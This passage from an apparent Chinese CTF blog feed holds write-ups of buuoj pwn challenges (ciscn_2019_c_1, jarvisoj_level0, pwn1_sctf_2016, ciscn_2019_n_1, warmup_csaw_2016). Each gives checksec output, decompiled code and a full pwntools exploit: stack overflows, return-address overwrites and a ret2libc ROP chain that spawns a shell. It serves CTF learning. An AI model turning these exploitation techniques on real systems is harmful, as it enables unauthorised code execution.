class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28565</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>jarvisoj_level0</title>
    <link href="https://www.ruomo.fun/2021/06/18/buuoj/jarvisoj_level0/"/>
    <id>https://www.ruomo.fun/2021/06/18/buuoj/jarvisoj_level0/</id>
    <published>2021-06-18T03:20:17.360Z</published>
    <updated>2021-06-18T04:24:16.508Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=level0                                                                                                                     4 ⨯</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69) Symbols       No    0               1               level0</span><br></pre></td></tr></table></figure><p>拖入ida64分析，由于<code>main</code>函数没什么价值，直接看<code>vulnerable_function</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一个函数，读入字符，保存到buf变量中。但是read读入字符数是0x200，buf到栈底距离是0x80，很明显会造成溢出。搜索字符串找到<code>callsystem</code>函数可以获取权限，地址是<code>0x400596</code>。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">elf = <span class="string">&#x27;./level0&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(elf)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn1_sctf_2016</title>
    <link href="https://www.ruomo.fun/2021/06/18/buuoj/pwn1_sctf_2016/"/>
    <id>https://www.ruomo.fun/2021/06/18/buuoj/pwn1_sctf_2016/</id>
    <published>2021-06-18T02:52:13.087Z</published>
    <updated>2021-06-18T04:24:33.681Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=pwn1_sctf_2016 </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   129) Symbols      No    0               3               pwn1_sctf_2016</span><br></pre></td></tr></table></figure><p>拖入ida分析，由于<code>main</code>函数没什么价值，直接看<code>vuln</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时不看中间一串，头部就是让你输入一个字符串，最大读入长度是32个字符，因为变量s到栈底的距离是3C，所以32个字符不会造成栈溢出。在中间一串结束后最后会输出&quot;So, &quot;加上变量s的内容。</p><p>中间一串看不懂也没事，找到关键的两个字符串“you”和“I”，那就去试试运行输入看看会发生什么。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ./pwn1_sctf_2016 </span><br><span class="line">Tell me something about yourself: Ihhh</span><br><span class="line">So, youhhh</span><br></pre></td></tr></table></figure><p>可以很明显看到，输入的I被替换成了you然后进行输出，也就是说输入的内容被增长了，中间那一堆的代码用处就是把s中的I替换成you。</p><p>回到源码，0x3C就是60，我们最大输入32个字符，如果全是I的话最后最大的长度就是96，很明显可以造成溢出并且覆盖到返回地址，这里是一个漏洞点。</p><p>能够造成溢出那么就找找有没有后门函数，Shift + F12搜一下就能看到<code>.rodata:080497F00000000DCcat flag.txt</code>。这个字符串在函数<code>get_flag</code>中，该函数的地址是<code>0x08048F0D</code>。</p><p>有了后门函数，可以覆盖返回地址，那就构造字符串覆盖返回地址跳转。该程序覆盖到返回地址，需要填充的字符数是<code>0x3C + 4</code>个，即<code>64</code>个字符。由于可以用I来替换成you，那么计算得出需要字符I共21个，再随便加个别的字符然后跟上需要跳转的地址，总共是<code>21 + 1 + 4 = 26</code>个字符，没有超出32字符的限制，说明可行。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">elf = <span class="string">&#x27;./pwn1_sctf_2016&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27190</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(elf)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">0x15</span> + <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py                                                                                                                           130 ⨯</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>: pid 2346</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x8f\x04</span><br><span class="line"></span><br><span class="line">flag&#123;Th1s_is_A_tEst_f1a9&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_2019_n_1</title>
    <link href="https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_n_1/"/>
    <id>https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_n_1/</id>
    <published>2021-06-18T02:00:38.993Z</published>
    <updated>2021-06-18T04:24:03.634Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=ciscn_2019_n_1  </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols       No    0               1               ciscn_2019_n_1</span><br></pre></td></tr></table></figure><p>运行了了一下试试，大概就像这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Let<span class="string">&#x27;s guess the number.</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">Its value should be 11.28125</span></span><br></pre></td></tr></table></figure><p>拖入ida64分析，由于<code>main</code>函数没什么价值，直接看<code>func</code>函数，这边看汇编会好一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400676                 public func</span><br><span class="line">.text:0000000000400676 func            proc near               ; CODE XREF: main+45↓p</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 var_30          = byte ptr -30h</span><br><span class="line">.text:0000000000400676 var_4           = dword ptr -4</span><br><span class="line">.text:0000000000400676</span><br><span class="line">.text:0000000000400676 ; __unwind &#123;</span><br><span class="line">.text:0000000000400676                 push    rbp</span><br><span class="line">.text:0000000000400677                 mov     rbp, rsp</span><br><span class="line">.text:000000000040067A                 sub     rsp, 30h</span><br><span class="line">.text:000000000040067E                 pxor    xmm0, xmm0</span><br><span class="line">.text:0000000000400682                 movss   [rbp+var_4], xmm0</span><br><span class="line">.text:0000000000400687                 mov     edi, offset s   ; &quot;Let&#x27;s guess the number.&quot;</span><br><span class="line">.text:000000000040068C                 call    _puts</span><br><span class="line">.text:0000000000400691                 lea     rax, [rbp+var_30]</span><br><span class="line">.text:0000000000400695                 mov     rdi, rax</span><br><span class="line">.text:0000000000400698                 mov     eax, 0</span><br><span class="line">.text:000000000040069D                 call    _gets</span><br><span class="line">.text:00000000004006A2                 movss   xmm0, [rbp+var_4]</span><br><span class="line">.text:00000000004006A7                 ucomiss xmm0, cs:dword_4007F4</span><br><span class="line">.text:00000000004006AE                 jp      short loc_4006CF</span><br><span class="line">.text:00000000004006B0                 movss   xmm0, [rbp+var_4]</span><br><span class="line">.text:00000000004006B5                 ucomiss xmm0, cs:dword_4007F4</span><br><span class="line">.text:00000000004006BC                 jnz     short loc_4006CF</span><br><span class="line">.text:00000000004006BE                 mov     edi, offset command ; &quot;cat /flag&quot;</span><br><span class="line">.text:00000000004006C3                 mov     eax, 0</span><br><span class="line">.text:00000000004006C8                 call    _system</span><br><span class="line">.text:00000000004006CD                 jmp     short loc_4006D9</span><br><span class="line">.text:00000000004006CF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004006CF</span><br><span class="line">.text:00000000004006CF loc_4006CF:                             ; CODE XREF: func+38↑j</span><br><span class="line">.text:00000000004006CF                                         ; func+46↑j</span><br><span class="line">.text:00000000004006CF                 mov     edi, offset aItsValueShould ; &quot;Its value should be 11.28125&quot;</span><br><span class="line">.text:00000000004006D4                 call    _puts</span><br><span class="line">.text:00000000004006D9</span><br><span class="line">.text:00000000004006D9 loc_4006D9:                             ; CODE XREF: func+57↑j</span><br><span class="line">.text:00000000004006D9                 nop</span><br><span class="line">.text:00000000004006DA                 leave</span><br><span class="line">.text:00000000004006DB                 retn</span><br><span class="line">.text:00000000004006DB ; &#125; // starts at 400676</span><br><span class="line">.text:00000000004006DB func            endp</span><br></pre></td></tr></table></figure><p>func函数的基本逻辑就是让你输入一个字符串，存到<code>var_30</code>这个变量中，然后用<code>var_4</code>这个变量和11.28125比较，如果相等输出flag。</p><p>那我们的关键点有：</p><ol><li>var_30想要覆盖var_4需要填充的字符数</li><li>浮点数11.28125在内存中的表示</li></ol><p>第一点计算比较简单，一个是ptr-30h，一个是ptr-4h，两个减一下就算出相差0x2C。</p><p>第二点在ida给我们展示的代码中可以看到，首先把var_4的值放到了xmm0寄存器中，然后将xmm0寄存器内容和cs:dword_4007F4中存放的值作比较。跳转到对应地址可以看到<code>.rodata:00000000004007F4 dword_4007F4    dd 41348000h</code>，说明浮点数11.28125在内存中的表示是<code>41348000h</code>。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">elf = <span class="string">&#x27;./ciscn_2019_n_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26033</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(elf)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2C</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>((sh.recvline()).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>warmup_csaw_2016</title>
    <link href="https://www.ruomo.fun/2021/06/17/buuoj/warmup_csaw_2016/"/>
    <id>https://www.ruomo.fun/2021/06/17/buuoj/warmup_csaw_2016/</id>
    <published>2021-06-17T02:49:12.314Z</published>
    <updated>2021-06-18T04:25:29.351Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=warmup_csaw_2016                                                                                                            1 ⨯</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               warmup_csaw_2016</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是覆盖返回地址的简单栈溢出，在程序运行时会输出&quot;WOW:&quot;然后跟上一个地址，该地址是函数<code>sub_40060D</code>的地址，实际上就是<code>0x40060D</code>。</p><p>计算v5到返回地址距离为0x48。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">elf = <span class="string">&#x27;./warmup_csaw_2016&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29199</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(elf)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys_addr = <span class="built_in">int</span>((sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))[<span 